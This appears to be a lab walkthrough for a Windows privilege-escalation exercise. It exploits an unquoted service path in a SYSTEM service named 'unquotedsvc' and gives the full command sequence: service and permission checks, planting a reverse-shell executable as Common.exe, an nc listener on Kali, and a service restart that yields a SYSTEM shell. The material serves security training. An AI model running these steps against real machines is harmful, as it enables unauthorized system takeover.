# ğŸ¾ Task 4: Exploiting Services - Unquoted Service Path
---

## ğŸ“œ Task Description
In this task, we will exploit a vulnerability in the `unquotedsvc` service, which runs with SYSTEM privileges. The vulnerability lies in its executable path, which is unquoted and contains spaces.

---

## ğŸ” Step 1: Checking the Service
First, check the configuration of the `unquotedsvc` service to confirm that it runs with SYSTEM privileges and has an unprotected path. Run the following command to gather information about the service:  
`"sc.exe qc unquotedsvc"`

### ğŸ“‹ Expected Output
- Ensure that the `SERVICE_START_NAME` indicates SYSTEM.
- Verify that the `BINARY_PATH_NAME` is not enclosed in quotes and contains spaces.  
![image](https://github.com/user-attachments/assets/c669a4f7-c517-43a3-a985-47021c10c0b5)

---

## ğŸ”‘ Step 2: Checking Access Permissions
Next, use `accesschk.exe` to check directory access permissions for the service. Run the following command:  
`"C:\PrivEsc\accesschk.exe /accepteula -uwdq 'C:\Program Files\Unquoted Path Service\'"`

### ğŸ“‹ Expected Output
- Confirm that the `BUILTIN\Users` group has write permissions on the directory.  
![image](https://github.com/user-attachments/assets/4f2972fe-e085-41c9-90de-f0415add5feb)

---

## ğŸ“‚ Step 3: Copying the Reverse Shell
Copy your `reverse.exe` executable to the service directory and rename it to `Common.exe`. Use the following command:  
`"copy C:\PrivEsc\reverse.exe 'C:\Program Files\Unquoted Path Service\Common.exe'"`

### ğŸ“‹ Expected Output
- Ensure the file is successfully copied and renamed.

---

## ğŸ§ Step 4: Setting Up the Listener
Before starting the service, ensure you have a listener running on Kali. Use the following command to set up the listener:  
`"nc -lvnp 53"`

---

## ğŸš€ Step 5: Starting the Service
Now, start the `unquotedsvc` service. It should execute `Common.exe` and provide you with a reverse shell with SYSTEM privileges. Run the following command:  
`"net start unquotedsvc"`

### ğŸ“‹ Expected Output
- Confirm that you have received a reverse shell on Kali.  
![image](https://github.com/user-attachments/assets/30e4f011-5f06-476d-9233-0a1cd8adc076)

---

## ğŸ‰ Congratulations!
You have successfully exploited an unquoted service path vulnerability to gain a reverse shell with SYSTEM privileges! ğŸŠ

---

## ğŸ“Œ Notes
- Ensure you understand each step and its implications.
- Use this knowledge responsibly and only within authorized penetration testing engagements.
